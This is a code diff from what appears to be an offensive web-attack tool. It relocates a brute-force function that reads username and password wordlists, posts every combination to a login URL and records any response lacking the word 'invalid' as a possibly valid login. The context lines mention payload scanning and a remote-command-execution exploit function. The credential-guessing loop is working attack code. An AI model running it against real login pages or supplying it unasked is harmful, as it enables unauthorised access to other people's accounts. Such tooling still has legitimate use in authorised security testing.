@@ -145,6 +145,24 @@ def run_scan(args):
     payloads = load_payloads(args.payload)
     run_mode(args.mode, args.url, payloads, args.thread, args.proxy, args.fuzz_params)
 
+def run_bruteforce(url, userlist, passlist):
+    if not userlist or not passlist:
+        print("[!] Missing wordlists.")
+        return
+    with open(userlist) as ufile, open(passlist) as pfile:
+        users = [u.strip() for u in ufile]
+        passwords = [p.strip() for p in pfile]
+    for user in users:
+        for pwd in passwords:
+            data = {'username': user, 'password': pwd}
+            try:
+                r = requests.post(url, data=data, timeout=5)
+                if "invalid" not in r.text.lower():
+                    print(f"[LOGIN] {user}:{pwd} => Possibly Valid")
+                    results.append({"mode": "bruteforce", "url": url, "payload": f"{user}:{pwd}", "vulnerable": True})
+            except:
+                continue
+
 # ===== Exploit & Post Exploit =====
 
 def exploit_rce(url, cmd, proxy):
@@ -202,24 +220,6 @@ def show_summary():
         print(tabulate(table, headers=["Type", "URL", "Payload/File/Cmd", "Vulnerable"], tablefmt="fancy_grid"))
     else:
         print("[!] No vulnerabilities found.")
-
-def run_bruteforce(url, userlist, passlist):
-    if not userlist or not passlist:
-        print("[!] Missing wordlists.")
-        return
-    with open(userlist) as ufile, open(passlist) as pfile:
-        users = [u.strip() for u in ufile]
-        passwords = [p.strip() for p in pfile]
-    for user in users:
-        for pwd in passwords:
-            data = {'username': user, 'password': pwd}
-            try:
-                r = requests.post(url, data=data, timeout=5)
-                if "invalid" not in r.text.lower():
-                    print(f"[LOGIN] {user}:{pwd} => Possibly Valid")
-                    results.append({"mode": "bruteforce", "url": url, "payload": f"{user}:{pwd}", "vulnerable": True})
-            except:
-                continue
 
 def display_results():
     if not results:
